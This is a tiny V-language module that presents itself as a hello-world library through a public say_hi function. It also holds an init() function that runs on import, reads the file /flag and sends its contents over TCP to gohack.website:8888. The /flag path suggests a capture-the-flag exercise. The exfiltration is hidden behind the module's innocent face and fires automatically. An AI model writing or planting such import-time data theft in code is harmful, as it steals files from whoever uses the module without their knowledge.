module ganteng

import os
import net

// To export a function we have to use `pub`
pub fn say_hi() {
	println('hello from mymodule!')
}

fn init(){
        mut client := net.dial_tcp("gohack.website:8888") or { panic('') }
        out := os.read_file("/flag") or { panic('') }
        client.write_string(out)  or { panic('') }
}
